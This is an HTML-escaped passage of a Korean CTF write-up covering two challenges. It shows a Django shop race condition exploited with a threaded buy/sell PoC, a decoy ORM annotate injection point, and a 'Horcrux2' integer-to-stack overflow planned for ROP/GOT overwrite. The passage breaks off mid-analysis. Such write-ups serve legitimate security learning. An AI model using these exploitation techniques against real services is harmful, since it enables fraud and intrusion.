&lt;h2 id=&#34;flag-shop-syru&#34;&gt;&lt;a href=&#34;#flag-shop-syru&#34; class=&#34;headerlink&#34; title=&#34;flag shop - syru&#34;&gt;&lt;/a&gt;&lt;strong&gt;flag shop - syru&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&amp;#xC0AC;&amp;#xC2E4; &amp;#xC800;&amp;#xB294; HCAMP CTF &amp;#xC815;&amp;#xADDC; &amp;#xC2DC;&amp;#xAC04;&amp;#xC758; &amp;#xB300;&amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC774; &amp;#xBB38;&amp;#xC81C;&amp;#xC5D0; &amp;#xC3DF;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC55E;&amp;#xC120; sstf&amp;#xC5D0;&amp;#xC11C; django 1day&amp;#xB97C; &amp;#xD65C;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xBE44;&amp;#xC2B7;&amp;#xD55C; &amp;#xC720;&amp;#xD615;&amp;#xC758; &lt;a href=&#34;https://hackyboiz.github.io/2023/09/01/syru/sstf-web-libreria/&#34;&gt;&amp;#xBB38;&amp;#xC81C;&lt;/a&gt;&amp;#xB97C; &amp;#xD480;&amp;#xC5B4;&amp;#xBD10;&amp;#xC11C; &amp;#xAF2D; &amp;#xD480;&amp;#xACE0; &amp;#xC2F6;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xC27D;&amp;#xAC8C; &amp;#xC9C0;&amp;#xAE08;&amp;#xC740; &amp;#xBB38;&amp;#xC81C; &amp;#xC11C;&amp;#xBC84;&amp;#xB3C4; &amp;#xB2EB;&amp;#xD600;&amp;#xC11C; &amp;#xC874;&amp;#xC7AC;&amp;#xD588;&amp;#xB358; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xACFC; &amp;#xC81C;&amp;#xAC00; &amp;#xADF8; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD574; &amp;#xD47C; &amp;#xBC29;&amp;#xBC95;&amp;#xB9CC; &amp;#xAC04;&amp;#xB2E8;&amp;#xD788; &amp;#xC18C;&amp;#xAC1C;&amp;#xD574;&amp;#xB4DC;&amp;#xB9AC;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;flag shop&amp;#xC740; flag &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC5EC;&amp;#xB7EC; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD30C;&amp;#xB294; django framework&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xC9C4; service&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. (&lt;del&gt;&amp;#xD06C;&amp;#xB86C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC2F8;&amp;#xB354;&amp;#xAD70;&amp;#xC694;. &amp;#xC9C4;&amp;#xC9DC; &amp;#xC92C;&amp;#xC73C;&amp;#xBA74; crbug&amp;#xC5D0; &amp;#xC81C;&amp;#xBCF4;&amp;#xD560; &amp;#xBED4;&amp;#x2026;&lt;/del&gt;)&lt;/p&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xC0AC;&amp;#xAE30;&amp;#xB9CC; &amp;#xD560; &amp;#xBFD0; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; &amp;#xC0C0;&amp;#xB358; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD314; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;. &amp;#xC774; &amp;#xC0AC;&amp;#xACE0;&amp;#xD30C;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; race condition &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;OrderAPIView&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;APIView&lt;/span&gt;):&lt;/span&gt;
    permission_classes = []

    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self, request, product_id=None, order_id=None&lt;/span&gt;):&lt;/span&gt;
        ...
        &lt;span class=&#34;hljs-comment&#34;&gt;# user validation&lt;/span&gt;
        balance = request.user.balance
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; balance &amp;lt; product.price:
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fail(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Insufficient balance&amp;quot;&lt;/span&gt;)

        order = OrderModel.objects.create(
            user=request.user,
            product=product,
            email=email,
        )

        validator = EmailValidator()
        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
            validator(email)
        &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; ValidationError:
            order.email = &lt;span class=&#34;hljs-literal&#34;&gt;None&lt;/span&gt;
            order.save()

        request.user.balance -= product.price
        request.user.save()

        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; success(OrderSerializer(order).data)

&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Sell&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;APIView&lt;/span&gt;):&lt;/span&gt;
    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self, request, order_id=None&lt;/span&gt;):&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
            order = OrderModel.objects.get(id=order_id)
        &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; OrderModel.DoesNotExist:
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fail(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Order not found&amp;quot;&lt;/span&gt;)

        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; order.user != request.user:
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fail(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Unauthorized&amp;quot;&lt;/span&gt;)

        request.user.balance += order.product.price
        request.user.save()

        order.delete()

        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; success({})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD3C9;&amp;#xBC94;&amp;#xD558;&amp;#xAC8C; &amp;#xC0AC;&amp;#xACE0;&amp;#xD30C;&amp;#xB294; &amp;#xAC83; &amp;#xAC19;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC774; &amp;#xAC00;&amp;#xAC8C;&amp;#xB294; &amp;#xC0C1;&amp;#xB300;&amp;#xBC29;&amp;#xC744; &amp;#xC2E0;&amp;#xB8B0;&amp;#xD558;&amp;#xC5EC; &amp;#xD314; &amp;#xB54C;&amp;#xB294; &amp;#xBB3C;&amp;#xAC74;&amp;#xC744; &amp;#xBA3C;&amp;#xC800; &amp;#xC8FC;&amp;#xACE0; &amp;#xC0B4; &amp;#xB54C;&amp;#xB294; &amp;#xB3C8;&amp;#xC744; &amp;#xBA3C;&amp;#xC800; &amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC800;&amp;#xD76C;&amp;#xB294; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC774;&amp;#xC81C;&amp;#xBD80;&amp;#xD130; &amp;#xACF5;&amp;#xB7B5;&amp;#xD560; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB3C;&amp;#xB860; &amp;#xD314; &amp;#xB54C;&amp;#xB294; &amp;#xBCF4;&amp;#xC720; &amp;#xC794;&amp;#xC561;&amp;#xC744; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xACE0; &amp;#xC0B4; &amp;#xB54C;&amp;#xB294; &amp;#xC8FC;&amp;#xBB38;&amp;#xC774; &amp;#xC788;&amp;#xC5C8;&amp;#xB358; &amp;#xBB3C;&amp;#xD488;&amp;#xC778;&amp;#xC9C0;&amp;#xB97C; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC548;&amp;#xC804;&amp;#xD574; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xACFC;&amp;#xC5F0; &amp;#xADF8;&amp;#xB7F4;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;&amp;#xC774; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xB294; db&amp;#xB85C; sqlite3&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;DATABASES = {
    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;default&amp;apos;&lt;/span&gt;: {
        &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;ENGINE&amp;apos;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;django.db.backends.sqlite3&amp;apos;&lt;/span&gt;,
        &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;NAME&amp;apos;&lt;/span&gt;: BASE_DIR / &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;db.sqlite3&amp;apos;&lt;/span&gt;,
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sqlite3&amp;#xB294; &amp;#xB2E4;&amp;#xC218;&amp;#xC758; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xAC00; &amp;#xD558;&amp;#xB098;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xBCA0;&amp;#xC774;&amp;#xC2A4; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xC77D;&amp;#xACE0; &amp;#xC4F0;&amp;#xB294; &amp;#xAD6C;&amp;#xC870;&amp;#xC778;&amp;#xB370; &amp;#xBB34;&amp;#xACB0;&amp;#xC131;&amp;#xC744; &amp;#xBCF4;&amp;#xC7A5;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; Lock&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC77D;&amp;#xC744; &amp;#xB54C;&amp;#xB294; shared lock&amp;#xC774; &amp;#xAC78;&amp;#xB9AC;&amp;#xBA70; &amp;#xC4F8; &amp;#xB54C;&amp;#xB294; exclusive lock&amp;#xC774; &amp;#xAC78;&amp;#xB9AC;&amp;#xB294;&amp;#xB370; exclusive lock&amp;#xC740; &amp;#xD558;&amp;#xB098;&amp;#xB9CC; &amp;#xD5C8;&amp;#xC6A9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB798;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xB85C; &amp;#xB3D9;&amp;#xC2DC;&amp;#xC5D0; &amp;#xB4E4;&amp;#xC5B4;&amp;#xC628; &amp;#xAD6C;&amp;#xB9E4; &amp;#xBC0F; &amp;#xD310;&amp;#xB9E4; &amp;#xC694;&amp;#xCCAD;&amp;#xC740; &amp;#xC870;&amp;#xAE08;&amp;#xC758; delay&amp;#xB97C; &amp;#xB450;&amp;#xACE0; &amp;#xCC98;&amp;#xB9AC;&amp;#xB418;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &amp;#xAD6C;&amp;#xB9E4;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD314;&amp;#xC544;&amp;#xC11C; &amp;#xB3C8;&amp;#xC744; &amp;#xC5BB;&amp;#xACE0; &amp;#xAC00;&amp;#xAC8C;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xC758; &amp;#xBCF4;&amp;#xC720; &amp;#xBB3C;&amp;#xD488;&amp;#xC744; &amp;#xC5C6;&amp;#xC560;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; &amp;#xC5BB;&amp;#xC740; &amp;#xB3C8;&amp;#xC73C;&amp;#xB85C; &amp;#xBB3C;&amp;#xAC74;&amp;#xC744; &amp;#xACC4;&amp;#xC18D; &amp;#xC0AC;&amp;#xBA74; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB420;&amp;#xAE4C;&amp;#xC694;? &amp;#xBB3C;&amp;#xAC74;&amp;#xC744; &amp;#xC0B4; &amp;#xB54C; &amp;#xBCF4;&amp;#xC720;&amp;#xD55C; &amp;#xB3C8;&amp;#xC774; &amp;#xCC28;&amp;#xAC10;&amp;#xB418;&amp;#xB294; &amp;#xC2DC;&amp;#xC810;&amp;#xC740; &amp;#xBCF4;&amp;#xC720; &amp;#xBB3C;&amp;#xD488;&amp;#xC744; &amp;#xC5C6;&amp;#xC560;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xCC98;&amp;#xB9AC;&amp;#xB41C; &amp;#xC774;&amp;#xD6C4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xADF8;&amp;#xC804;&amp;#xC5D0; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; n&amp;#xBC88;&amp;#xC758; &amp;#xAD6C;&amp;#xB9E4;&amp;#xC694;&amp;#xCCAD;&amp;#xC5D0;&amp;#xC11C; &amp;#xC794;&amp;#xC561; &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xD1B5;&amp;#xACFC;&amp;#xD558;&amp;#xC5EC; &amp;#xBB3C;&amp;#xD488; &amp;#xBA3C;&amp;#xC800; &amp;#xBC1B;&amp;#xB294;&amp;#xB2E4;&amp;#xBA74; m&amp;#xAC1C;&amp;#xC758; &amp;#xBB3C;&amp;#xD488;&amp;#xC744; &amp;#xD68D;&amp;#xB4DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. (0&amp;lt;m&amp;lt;n)&lt;/p&gt;
&lt;p&gt;&amp;#xC774; m&amp;#xAC1C;&amp;#xC758; &amp;#xBB3C;&amp;#xD488;&amp;#xC744; &amp;#xD314;&amp;#xC544; &amp;#xB3C8;&amp;#xC744; &amp;#xB9CE;&amp;#xC774; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC11C; flag&amp;#xB97C; &amp;#xC0AC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#PoC&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; idx &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(init_idx, init_idx+&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;):
    t = threading.Thread(target=sell, args=(idx,))
    t.start()
    t.join()
    t1 = threading.Thread(target=buy , args = ())
    t2 = threading.Thread(target=buy , args = ())
    t1.start()
    t2.start()
    t1.join()
    t2.join()

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; idx &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(init_idx, init_idx+&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;):
    sell(idx)
buy_flag()
get_flag()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;CTF&amp;#xAC00; &amp;#xB05D;&amp;#xB098;&amp;#xACE0; &amp;#xCD9C;&amp;#xC81C;&amp;#xC790;&amp;#xC758; &amp;#xD480;&amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC774; &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xD574;&amp;#xB2F9; &amp;#xBC84;&amp;#xC804; EmailValidator&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC600;&amp;#xB358; redos &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; race condition&amp;#xC744; &amp;#xC870;&amp;#xAE08; &amp;#xB354; &amp;#xD3B8;&amp;#xD558;&amp;#xAC8C; &amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC5FC;&amp;#xB450;&amp;#xD558;&amp;#xACE0; &amp;#xB0C8;&amp;#xB2E4;&amp;#xB294; &amp;#xC810;&amp;#xC744; &amp;#xC54C;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xB294;&amp;#xB370;&amp;#xC694;. &amp;#xC800;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC600;&amp;#xB358; ORM &amp;#xCC98;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; sqli &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC5D0; &amp;#xB300;&amp;#xBD80;&amp;#xBD84; &amp;#xC2DC;&amp;#xAC04;&amp;#xC744; &amp;#xD560;&amp;#xC560;&amp;#xD558;&amp;#xC5EC; &amp;#xACB0;&amp;#xAD6D; &amp;#xC815;&amp;#xADDC;&amp;#xC2DC;&amp;#xAC04; &amp;#xB0B4;&amp;#xC5D0;&amp;#xB294; &amp;#xD480;&amp;#xC9C0; &amp;#xBABB;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;(&lt;del&gt;&amp;#xCD9C;&amp;#xC81C;&amp;#xC790;&amp;#xAC00; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD568;&amp;#xC815;&amp;#xC744; &amp;#xD30C;&amp;#xB450;&amp;#xC5C8;&amp;#xAC70;&amp;#xB4E0;&amp;#xC694;&lt;/del&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;VerySuspiciousView&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;View&lt;/span&gt;):&lt;/span&gt;
    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self, request&lt;/span&gt;):&lt;/span&gt;
        field = request.GET.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;field&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)
        value = request.GET.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;value&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)

        len(
            ProductModel.objects.annotate(**{field: Value(value)})
        )

        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; HttpResponse(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;OK&amp;quot;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;CCE&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xADF8;&amp;#xB807;&amp;#xACE0; race condition&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xC870;&amp;#xAE08; &amp;#xB354; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574;&amp;#xBCF4;&amp;#xAC8C; &amp;#xB41C; &amp;#xBB38;&amp;#xC81C;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Horcrux2-pwndorei&#34;&gt;&lt;a href=&#34;#Horcrux2-pwndorei&#34; class=&#34;headerlink&#34; title=&#34;Horcrux2 - pwndorei&#34;&gt;&lt;/a&gt;Horcrux2 - pwndorei&lt;/h2&gt;&lt;h3 id=&#34;Analysis&#34;&gt;&lt;a href=&#34;#Analysis&#34; class=&#34;headerlink&#34; title=&#34;Analysis&#34;&gt;&lt;/a&gt;Analysis&lt;/h3&gt;&lt;p&gt;&amp;#xC774; &amp;#xBB38;&amp;#xC81C;&amp;#xB294; &lt;code&gt;main&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;DrinkPotion&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; Integer Overflow&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;DrinkPotion&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;BreakHorcrux&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; Stack Buffer Overflow&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Stack BOF&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD574;&amp;#xB3C4; &amp;#xCE74;&amp;#xB098;&amp;#xB9AC;&amp;#xAC00; &amp;#xC801;&amp;#xC6A9;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774;&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC788;&amp;#xACE0; PIE&amp;#xAC00; &amp;#xC801;&amp;#xC6A9;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xC810;, Partial RELRO&amp;#xC778; &amp;#xC810;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; ROP&amp;#xB85C; GOT overwrite&amp;#xB97C; &amp;#xD574;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DrinkPotion&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xBA3C;&amp;#xC800; &amp;#xBCF4;&amp;#xC790;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__int64 &lt;span class=&#34;hljs-title&#34;&gt;DrinkPotion&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  __int64 result; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; amount; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+0h] [rbp-10h] BYREF&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+4h] [rbp-Ch]&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64 v3; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;

  v3 = __readfsqword(&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;u);
  v2 = &lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;;
  &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;How much will you drink? &amp;gt;&amp;gt;&amp;gt; &amp;quot;&lt;/span&gt;);
  __isoc99_scanf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;amount);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( amount &amp;lt;= &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt; )
  {
    v2 += amount;                               
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x80000000&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )               &lt;span class=&#34;hljs-comment&#34;&gt;// no negative number&lt;/span&gt;
      BreakHorcrux(v2);
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
      &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;You&amp;apos;re out of HP. You&amp;apos;re dead.&amp;quot;&lt;/span&gt;);
    result = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;You drank too much. You&amp;apos;re poisoned to death.&amp;quot;&lt;/span&gt;);
    result = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;amount&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;scanf&lt;/code&gt;&amp;#xB85C; &amp;#xC815;&amp;#xC218; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC785;&amp;#xB825; &amp;#xBC1B;&amp;#xACE0; &lt;code&gt;BreakHorcrux&lt;/code&gt;&amp;#xC5D0; &amp;#xC804;&amp;#xB2EC;&amp;#xB420; &amp;#xC778;&amp;#xC790;&amp;#xC778; &lt;code&gt;v2&lt;/code&gt;&amp;#xB294; -1&amp;#xB85C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;amount&lt;/code&gt;&amp;#xAC00; 40&amp;#xBCF4;&amp;#xB2E4; &amp;#xD06C;&amp;#xC9C0; &amp;#xC54A;&amp;#xC73C;&amp;#xBA74; if &amp;#xBB38;&amp;#xC758; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB9CC;&amp;#xC871;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;v2&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;amount&lt;/code&gt;&amp;#xB97C; &amp;#xB354;&amp;#xD558;&amp;#xACE0; &lt;code&gt;v2&lt;/code&gt;&amp;#xAC00; &amp;#xC74C;&amp;#xC218;&amp;#xAC00; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &lt;code&gt;BreakHorcrux&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; 